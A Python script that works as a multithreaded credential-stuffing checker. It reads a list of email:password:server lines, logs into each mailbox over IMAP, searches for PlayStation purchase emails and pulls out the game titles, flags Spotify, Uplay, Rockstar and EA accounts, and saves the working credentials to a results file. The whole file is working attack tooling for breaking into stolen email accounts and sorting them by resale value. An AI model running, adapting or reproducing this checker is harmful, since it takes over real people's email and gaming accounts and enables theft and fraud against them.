import threading, email, imaplib
from multiprocessing.pool import ThreadPool as Pool
from bs4 import BeautifulSoup
from tkinter import Tk
from tkinter.filedialog import askopenfilename
from datetime import datetime
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

path = os.getcwd()
directory = path + "/results"
if not os.path.exists(directory):
    os.makedirs(directory)
Tk().withdraw()
dat_file = askopenfilename(title="choose your file",filetypes=(("Text file", "*.txt"), ("all files", "*.*")))
now = datetime.now()
current_time = now.strftime("%H:%M:%S")
filesaver = directory + "/" + current_time + ".txt"
w = open(filesaver, "a")
f = open(dat_file)
lines = f.read().splitlines()
pool_size = 25

def checker(line):
    splitter = line.split(":")
    user = splitter[0]
    password = splitter[1]
    connection = splitter[2]
    try:
        #CONFIGURAION
        mail = imaplib.IMAP4_SSL(connection)
        mail.login(user, password)
        mail.select("inbox")

        #CHECKS
        game = []
        spotify = False
        uplay = False
        socialclub = False
        EA = False

        #PSN
        _, searchdata = mail.search(None, '(FROM "Playstation")')
        for num in searchdata[0].split():
            _, data = mail.fetch(num, "(RFC822)")
            _, byt = data[0]
            message = email.message_from_bytes(byt)
            for part in message.walk():
                if part.get_content_type() == "text/plain" or part.get_content_type() == "text/html":
                    body = part.get_payload(decode=True)
                    soup = BeautifulSoup(body, "html.parser")
                    item = soup.find_all("a", href="#")
                    if len(item) >= 1:
                        newsoup = BeautifulSoup(str(item), "html.parser")
                        text = newsoup.get_text()[1:-1]
                        final_text = text.split(" , ")
                        if len(final_text) > 1:
                            games = final_text[-1]
                            game.append(games)
        if len(game) >= 1:
            w = open(filesaver, "a")
            print(bcolors.OKGREEN + user + " has psn games!")
            #SPOTIFY
            _, searchspotify = mail.search(None, '(FROM "Spotify")')
            if len(searchspotify[0].split()) >= 1:
                spotify = True
            #UPLAY
            _, searchuplay = mail.search(None, '(FROM "Uplay")')
            if len(searchuplay[0].split()) >= 1:
                uplay = True
            #SOICAL
            _, searchsocial = mail.search(None, '(FROM "noreply@rockstargames.com")')
            if len(searchsocial[0].split()) >= 1:
                socialclub = True
            #EA
            _, searchorigin = mail.search(None, '(FROM "EA")')
            if len(searchorigin[0].split()) >= 1:
                EA = True
            w.write(user + ":" + password + "\n")
            w.write("OTHER:\n")
            if spotify == True:
                w.write("SPOTIFY\n")
            if uplay == True:
                w.write("UPLAY\n")
            if socialclub == True:
                w.write("SOCIAL CLUB\n")
            if EA == True:
                w.write("ORIGIN\n")
            w.write("\n")
            w.write("GAMES:" + "\n")
            for end in game:
                w.write(end + "\n")
            w.write("<============================>\n")
            w.close()
        else:
            print(bcolors.WARNING + user + " does not have a PSN account!")
    except:
        print(bcolors.FAIL +  user + " has wrong email or password!")

def worker(line):
    try:
        checker(line)
    except:
        print('error with line')

pool = Pool(pool_size)

for line in lines:
    pool.apply_async(worker, (line,))

pool.close()
pool.join()
print(bcolors.OKGREEN + "Checking is finished!")